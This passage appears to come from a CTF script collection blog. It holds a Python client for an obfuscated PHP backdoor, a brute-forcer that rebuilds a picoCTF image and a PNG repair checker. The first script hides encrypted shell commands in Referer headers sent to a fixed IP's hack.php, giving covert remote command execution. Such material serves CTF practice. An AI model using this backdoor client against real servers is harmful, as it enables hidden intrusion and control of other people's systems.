string</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choicePart</span><span class="params">(seq,amount)</span>:</span></span><br><span class="line">    length = len(seq)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Error Input'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    result = []</span><br><span class="line">    indexes = []</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = randint(<span class="number">0</span>,length<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">            indexes.append(i)</span><br><span class="line">            result.append(seq[i])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randBytesFlow</span><span class="params">(amount)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += chr(randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span>  result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randAlpha</span><span class="params">(amount)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += choice(string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loopXor</span><span class="params">(text,key)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    lenKey = len(key)</span><br><span class="line">    lenTxt = len(text)</span><br><span class="line">    iTxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> iTxt &lt; lenTxt:</span><br><span class="line">        iKey = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> iTxt&lt;lenTxt <span class="keyword">and</span> iKey&lt;lenKey:</span><br><span class="line">            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))</span><br><span class="line">            iTxt += <span class="number">1</span></span><br><span class="line">            iKey += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debugPrint</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="keyword">print</span> msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">debugging = <span class="literal">False</span></span><br><span class="line">keyh = <span class="string">"42f7"</span> <span class="comment"># $kh</span></span><br><span class="line">keyf = <span class="string">"e9ac"</span> <span class="comment"># $kf</span></span><br><span class="line">xorKey = keyh + keyf</span><br><span class="line">url = <span class="string">'http://111.198.29.45:44036/hack.php'</span></span><br><span class="line">defaultLang = <span class="string">'zh-CN'</span></span><br><span class="line">languages = [<span class="string">'zh-TW;q=0.%d'</span>,<span class="string">'zh-HK;q=0.%d'</span>,<span class="string">'en-US;q=0.%d'</span>,<span class="string">'en;q=0.%d'</span>]</span><br><span class="line">proxies = <span class="literal">None</span> <span class="comment"># &#123;'http':'http://127.0.0.1:8080'&#125; # proxy for debug</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate random Accept-Language only once each session</span></span><br><span class="line">langTmp = choicePart(languages,<span class="number">3</span>)</span><br><span class="line">indexes = sorted(choicePart(range(<span class="number">1</span>,<span class="number">10</span>),<span class="number">3</span>), reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">acceptLang = [defaultLang]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    acceptLang.append(langTmp[i] % (indexes[i],))</span><br><span class="line">acceptLangStr = <span class="string">','</span>.join(acceptLang)</span><br><span class="line">debugPrint(acceptLangStr)</span><br><span class="line"></span><br><span class="line">init2Char = acceptLang[<span class="number">0</span>][<span class="number">0</span>] + acceptLang[<span class="number">1</span>][<span class="number">0</span>] <span class="comment"># $i</span></span><br><span class="line">md5head = (md5(init2Char + keyh).hexdigest())[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">md5tail = (md5(init2Char + keyf).hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + randAlpha(randint(<span class="number">3</span>,<span class="number">8</span>))</span><br><span class="line">debugPrint(<span class="string">'$i is %s'</span> % (init2Char))</span><br><span class="line">debugPrint(<span class="string">'md5 head: %s'</span> % (md5head,))</span><br><span class="line">debugPrint(<span class="string">'md5 tail: %s'</span> % (md5tail,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive php shell</span></span><br><span class="line">cmd = raw_input(<span class="string">'phpshell &gt; '</span>)</span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">''</span>:</span><br><span class="line">    <span class="comment"># build junk data in referer</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(max(indexes)+<span class="number">1</span>+randint(<span class="number">0</span>,<span class="number">2</span>)):</span><br><span class="line">        key = randAlpha(randint(<span class="number">3</span>,<span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="number">3</span>,<span class="number">12</span>)))</span><br><span class="line">        query.append((key, value))</span><br><span class="line">    debugPrint(<span class="string">'Before insert payload:'</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(urllib.urlencode(query))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encode payload</span></span><br><span class="line">    payload = zlib.compress(cmd)</span><br><span class="line">    payload = loopXor(payload,xorKey)</span><br><span class="line">    payload = base64.urlsafe_b64encode(payload)</span><br><span class="line">    payload = md5head + payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cut payload, replace into referer</span></span><br><span class="line">    cutIndex = randint(<span class="number">2</span>,len(payload)<span class="number">-3</span>)</span><br><span class="line">    payloadPieces = (payload[<span class="number">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class="line">    iPiece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>],payloadPieces[iPiece])</span><br><span class="line">        iPiece += <span class="number">1</span></span><br><span class="line">    referer = url + <span class="string">'?'</span> + urllib.urlencode(query)</span><br><span class="line">    debugPrint(<span class="string">'After insert payload, referer is:'</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(referer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send request</span></span><br><span class="line">    r = sess.get(url,headers=&#123;<span class="string">'Accept-Language'</span>:acceptLangStr,<span class="string">'Referer'</span>:referer&#125;,proxies=proxies)</span><br><span class="line">    html = r.text</span><br><span class="line">    debugPrint(html)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># process response</span></span><br><span class="line">    pattern = re.compile(<span class="string">r'&lt;%s&gt;(.*)&lt;/%s&gt;'</span> % (xorKey,xorKey))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="keyword">if</span> len(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Error,  no backdoor response'</span></span><br><span class="line">        cmd = raw_input(<span class="string">'phpshell &gt; '</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    debugPrint(output)</span><br><span class="line">    output = output.decode(<span class="string">'base64'</span>)</span><br><span class="line">    output = loopXor(output,xorKey)</span><br><span class="line">    output = zlib.decompress(output)</span><br><span class="line">    <span class="keyword">print</span> output</span><br><span class="line">    cmd = raw_input(<span class="string">'phpshell &gt; '</span>)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="js加密bytes转img脚本"><a href="#js加密bytes转img脚本" class="headerlink" title="js加密bytes转img脚本"></a>js加密bytes转img脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b = list(map(int, <span class="string">'230 231 15 119 0 207 252 10 223 255 236 181 64 109 202 199 107 239 234 62 13 133 240 114 73 122 212 133 52 83 96 205 110 80 249 71 0 121 249 65 0 157 103 12 174 4 68 11 98 0 215 114 119 0 183 217 1 69 216 220 73 94 95 13 137 0 95 2 55 10 166 64 84 0 125 116 0 232 106 213 0 16 195 223 40 0 68 181 2 0 255 11 155 66 48 255 164 115 23 233 81 73 231 133 189 120 78 68 145 72 75 195 64 132 157 64 13 18 0 51 16 31 0 13 89 192 170 130 10 203 46 140 98 57 26 102 131 52 0 0 15 77 243 82 201 255 78 175 252 172 1 65 137 194 156 237 239 110 156 108 63 118 1 227 145 191 68 195 102 243 192 71 64 116 101 227 59 68 0 179 129 53 120 213 250 65 180 168 102 154 124 71 235 180 70 173 23 86 64 249 197 70 126 152 252 188 91 150 135 95 51 75 223 249 80 110 243 103 206 59 169 93 55 174 61 241 113 127 85 112 62 237 217 114 146 58 30 99 169 206 243 207 248 194 79 51 82 102 129 73 107 102 17 99 226 191 219 82 17 16 231 249 60 222 226 69 211 239 231 222 121 214 29 206 212 196 125 6 109 73 64 60 114 45 229 231 235 156 73 209 126 85 229 229 21 86 176 201 127 179 127 128 125 143 61 126 125 38 239 252 6 255 12 149 131 1 40 31 98 230 243 174 195 213 57 84 93 35 162 84 155 126 146 244 154 166 108 124 107 250 230 99 176 66 30 151 212 49 121 125 149 7 114 13 9 18 36 252 214 228 86 114 115 229 179 120 108 95 80 127 3 31 37 102 249 203 29 141 74 55 127 107 69 249 100 213 111 249 106 88 174 255 214 9 171 244 185 21 167 116 157 124 248 94 156 153 132 142 235 160 40 1 113 17 180 238 254 117 104 253 90 67 71 2 208 115 207 249 226 246 9 251 248 120 39 57 149 42 187 216 202 105 194 56 198 147 149 211 164 201 218 126 154 250 39 60 225 138 142 73 248 75 210 250 177 182 90 234 249 175 89 24 202 151 15 229 157 196 39 244 207 251 156 1 80 128 78 134 146 173 57 203 202 68 124 241 252 67 65 144 122 181 211 199 26 137 251 174 131 125 46 227 135 238 108 174 202 187 157 227 95 67 139 117 228 118 65 218 255 66 38 168 131 23 143 119 228 80 54 98 255 178 13 17 149 174 109 193 214 156 48 181 242 247 205 198 66 202 246 227 138 134 74 230 207 231 62 99 252 223 115 126 136 144 190 231 18 109 252 16 211 199 248 214 8 183 71 217 126 57 130 190 1 68 239 103 240 85 204 205 252 87 175 74 113 202 222 87 71 36 248 124 163 24 223 63 51 111 207 143 233 53 164 174 178 9 214 223 148 239 11 223 249 188 253 73 38 43 19 231 25 239 90 29 115 231 231 105 217 201 235 113 196 67 30 167 82 113 151 52 178 199 101 157 249 202 117 185 42 180 74 212 162 150 6 54 222 127 76 0 87 142 63 41 159 247 254 225'</span>.split(<span class="string">' '</span>)))</span><br><span class="line">png_header = <span class="string">'89504e470d0a1a0a0000000d49484452'</span></span><br><span class="line">png_header = [png_header[i*<span class="number">2</span>:(i+<span class="number">1</span>)*<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(png_header) // <span class="number">2</span>)]</span><br><span class="line">png_header = list(map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), png_header))</span><br><span class="line"></span><br><span class="line">LEN = <span class="number">16</span></span><br><span class="line">key = [<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(LEN)]</span><br><span class="line"></span><br><span class="line">shifters = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">    shifters_i = []</span><br><span class="line">    <span class="keyword">for</span> shifter <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> b[(shifter * LEN) % len(b) + i] == png_header[i]:</span><br><span class="line">            shifters_i.append(shifter)</span><br><span class="line"></span><br><span class="line">    shifters.append(shifters_i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assemble_png</span><span class="params">(k)</span>:</span></span><br><span class="line">    result = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">30000</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">        shifter = ord(k[i]) - ord(<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(b) // LEN):</span><br><span class="line">            result[(j * LEN) + i] = b[(((j + shifter) * LEN) % len(b)) + i]</span><br><span class="line"></span><br><span class="line">    i = len(result) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> result[i] == <span class="number">0</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    result = result[:i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">valid_keys = []</span><br><span class="line">print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(<span class="string">'#'</span>, <span class="string">'Candidate'</span>, <span class="string">'isValid?'</span>))</span><br><span class="line"><span class="keyword">for</span> i, key_candidate <span class="keyword">in</span> enumerate(itertools.product(*shifters)):</span><br><span class="line">    key_candidate = <span class="string">''</span>.join(map(str, key_candidate))</span><br><span class="line"></span><br><span class="line">    png_candidate = assemble_png(key_candidate)</span><br><span class="line">    f = io.BytesIO(bytes(png_candidate))</span><br><span class="line"></span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pilimage = Image.open(f)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        valid_keys.append(key_candidate)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(i, key_candidate, valid))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> valid_keys:</span><br><span class="line">    f = io.BytesIO(bytes(assemble_png(key)))</span><br><span class="line">    pilimage = Image.open(f)</span><br><span class="line">    decoded = decode(pilimage)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'picoCTF'</span> <span class="keyword">in</span> str(decoded.data):</span><br><span class="line">        print(str(decoded.data, <span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="png图片修复"><a href="#png图片修复" class="headerlink" title="png图片修复"></a>png图片修复</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> difflib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(map(<span class="keyword">lambda</span> x: <span class="string">'\\x&#123;:02x&#125;'</span>.format(ord(x)), s))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc_to_hex</span><span class="params">(c)</span>:</span></span><br><span class="line">    c = hex(c)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(map(<span class="keyword">lambda</span> x: <span class="string">'\\x&#123;&#125;'</span>.format(x), (c[<span class="number">2</span>*i : <span class="number">2</span>*i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c) / <span class="number">2</span>))))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(map(<span class="keyword">lambda</span> x: <span class="string">'\\x&#123;:02x&#125;'</span>.format(ord(x)), s))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_chunk_data</span><span class="params">(png, pos)</span>:</span></span><br><span class="line">    c_length = struct.unpack(<span class="string">'&gt;I'</span>, png[pos : pos + <span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">    c_type   = png[pos + <span class="number">4</span> : pos + <span class="number">8</span>]</span><br><span class="line">    c_data   = png[pos + <span class="number">8</span> : pos + <span class="number">8</span> + c_length]</span><br><span class="line">    c_crc    = png[pos + <span class="number">8</span> + c_length : pos + <span class="number">8</span> + c_length + <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    c_size   = <span class="number">12</span> + c_length</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (c_length, c_type, c_data, c_crc, c_size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_IHDR</span><span class="params">(c_data)</span>:</span></span><br><span class="line">    width     = struct.unpack(<span class="string">'&gt;I'</span>, c_data[:<span class="number">4</span>][<span class="number">0</span>])</span><br><span class="line">    height    = struct.unpack(<span class="string">'&gt;I'</span>, c_data[<span class="number">4</span>:<span class="number">8</span>][<span class="number">0</span>])</span><br><span class="line">    bit_depth = struct.unpack(<span class="string">'&gt;b'</span>, c_data[<span class="number">9</span>:<span class="number">10</span>][<span class="number">0</span>])</span><br><span class="line">    compression_method = struct.unpack(<span class="string">'&gt;b'</span>, c_data[<span class="number">10</span>:<span class="number">11</span>][<span class="number">0</span>])</span><br><span class="line">    filter_method = struct.unpack(<span class="string">'&gt;b'</span>, c_data[<span class="number">11</span>:<span class="number">12</span>][<span class="number">0</span>])</span><br><span class="line">    interlace_method = struct.unpack(<span class="string">'&gt;b'</span>, c_data[<span class="number">12</span>:<span class="number">13</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (width, height, bit_depth, compression_method, filter_method, interlace_method)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    png = open(args.png, <span class="string">'r'</span>).read()</span><br><span class="line"></span><br><span class="line">    suggestions = []</span><br><span class="line">    suggestions_level = []</span><br><span class="line">    error_level = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check file header</span></span><br><span class="line">    png_header = map(chr, [<span class="number">0x89</span>, <span class="number">0x50</span>, <span class="number">0x4e</span>, <span class="number">0x47</span> ,<span class="number">0x0d</span>, <span class="number">0x0a</span> ,<span class="number">0x1a</span> ,<span class="number">0x0a</span>])</span><br><span class="line">    <span class="keyword">if</span> png[:<span class="number">8</span>] != <span class="string">''</span>.join(png_header):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Invalid file header:\n'</span> + \</span><br><span class="line">              <span class="string">'\t'</span> + <span class="string">' '</span>.join(p.encode(<span class="string">'hex'</span>) <span class="keyword">for</span> p <span class="keyword">in</span> png[:<span class="number">8</span>])    + <span class="string">', should be:\n'</span> + \</span><br><span class="line">              <span class="string">'\t'</span> + <span class="string">' '</span>.join(p.encode(<span class="string">'hex'</span>) <span class="keyword">for</span> p <span class="keyword">in</span> png_header)</span><br><span class="line">        error_level = <span class="number">4</span></span><br><span class="line">        suggestions.append(<span class="string">'printf "&#123;&#125;" | dd of=&#123;&#125; bs=1 seek=&#123;&#125; count=&#123;&#125; conv=notrunc'</span>.format(</span><br><span class="line">            str_to_hex(<span class="string">''</span>.join(png_header)), args.png, <span class="number">0</span>, <span class="number">8</span>))</span><br><span class="line">        suggestions_level.append(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Chunks:'</span></span><br><span class="line"></span><br><span class="line">    png_valid_headres = [<span class="string">'PLTE'</span>, <span class="string">'IDAT'</span>, <span class="string">'IEND'</span>, </span><br><span class="line">                         <span class="string">'cHRM'</span>, <span class="string">'gAMA'</span>,<span class="string">'iCCP'</span>, <span class="string">'sBIT'</span>, <span class="string">'sRGB'</span>, <span class="string">'bKGD'</span>, <span class="string">'hIST'</span>, <span class="string">'tRNS'</span>, <span class="string">'pHYs'</span>, <span class="string">'sPLT'</span>, <span class="string">'tIME'</span>, <span class="string">'iTXt'</span>, <span class="string">'tEXt'</span>, <span class="string">'zTXt'</span>]</span><br><span class="line">    parsed_chunks = []</span><br><span class="line">    c_id = <span class="number">0</span></span><br><span class="line">    pos = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'&#123;:&lt;6&#125;&#123;:&lt;15&#125;&#123;:&lt;15&#125;&#123;:&lt;6&#125;&#123;:&lt;15&#125;&#123;:&lt;15&#125;&#123;&#125;'</span>.format(<span class="string">'#'</span>, <span class="string">'Start'</span>, <span class="string">'Length'</span>, <span class="string">'type'</span>, <span class="string">'crc'</span>, <span class="string">'size'</span>, <span class="string">'info'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check chunks</span></span><br><span class="line">    OK = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span> OK:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c_length, c_type, c_data, c_crc, c_size = get_chunk_data(png, pos)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        c_errors = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> c_id == <span class="number">0</span>: <span class="comment"># First chunk - IHDR</span></span><br><span class="line">            <span class="keyword">if</span> c_type != <span class="string">'IHDR'</span>:</span><br><span class="line">                c_errors.append(<span class="string">'Invalid chunk type (&#123;&#125;), should be "&#123;&#125;"'</span>.format(c_type, <span class="string">'IHDR'</span>))</span><br><span class="line">                error_level = max(error_level, <span class="number">3</span>)</span><br><span class="line">                suggestions.append(<span class="string">'printf "IHDR" | dd of=&#123;&#125; bs=1 seek=&#123;&#125; count=&#123;&#125; conv=notrunc'</span>.format(args.png, pos+<span class="number">4</span>, <span class="number">4</span>))</span><br><span class="line">                suggestions_level.append(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> c_length != <span class="number">13</span>:</span><br><span class="line">                c_errors.append(<span class="string">'Invalid chunk length (&#123;&#125;), should be &#123;&#125;'</span>.format(c_length, <span class="number">13</span>))</span><br><span class="line">                error_level = max(error_level, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> c_type <span class="keyword">not</span> <span class="keyword">in</span> png_valid_headres:</span><br><span class="line">                close_matches = difflib.get_close_matches(c_type, png_valid_headres, cutoff=<span class="number">0.3</span>)</span><br><span class="line">                <span class="keyword">if</span> close_matches != []:</span><br><span class="line">                    c_errors.append(<span class="string">'Invalid chunk type (&#123;&#125;), maybe you meant "&#123;&#125;"'</span>.format(c_type, close_matches[<span class="number">0</span>]))</span><br><span class="line">                    error_level = max(error_level, <span class="number">3</span>)</span><br><span class="line">                    suggestions.append(<span class="string">'printf "&#123;&#125;" | dd of=&#123;&#125; bs=1 seek=&#123;&#125; count=&#123;&#125; conv=notrunc'</span>.format(close_matches[<span class="number">0</span>], args.png, pos+<span class="number">4</span>, <span class="number">4</span>))</span><br><span class="line">                    suggestions_level.append(<span class="number">3</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    c_errors.append(<span class="string">'Invalid chunk type (&#123;&#125;)'</span>.format(c_type))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> pos + c_length &gt; len(png) - <span class="number">12</span> <span class="keyword">and</span> c_type != <span class="string">'IEND'</span>:</span><br><span class="line">                c_errors.append(<span class="string">'Invalid chunk length (&#123;&#125;), maximum is: &#123;&#125;'</span>.format(c_length, len(png) - <span 